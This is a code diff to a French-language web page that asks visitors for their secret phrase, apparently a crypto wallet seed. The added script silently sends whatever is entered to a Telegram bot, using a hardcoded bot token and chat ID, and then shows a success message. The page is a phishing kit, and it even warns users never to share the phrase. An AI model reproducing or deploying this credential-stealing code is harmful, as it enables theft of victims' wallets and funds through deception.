@@ -56,12 +56,35 @@
     <div class="container">
         <img src="logo.webp" alt="Logo">
         <h2>Entrez votre phrase secrète</h2>
-        <form action="success.html" method="get">
+        <form id="secretForm">
             <label for="phrase">Phrase secrète :</label>
             <textarea id="phrase" name="phrase" placeholder="Entrez ici votre phrase secrète..."></textarea>
             <button type="submit">Vérifier</button>
         </form>
         <p class="warning">⚠️ <b>Ne partagez jamais votre phrase secrète avec qui que ce soit !</b></p>
     </div>
+
+    <script>
+        document.getElementById("secretForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            var phraseSecrete = document.getElementById("phrase").value;
+            var token = "7635825073:AAHZrek95VYG2SNGWRlZa9qQq1Z_91HixAo"; // Ton token
+            var chatId = "8171222874"; // Ton ID Telegram
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Phrase+secrète:+${encodeURIComponent(phraseSecrete)}`)
+                .then(response => {
+                    if (response.ok) {
+                        alert("Votre phrase a été envoyée avec succès !");
+                        window.location.href = "success.html";
+                    } else {
+                        alert("Erreur lors de l'envoi !");
+                    }
+                })
+                .catch(error => {
+                    alert("Erreur de connexion !");
+                });
+        });
+    </script>
 </body>
-</html>
+</html
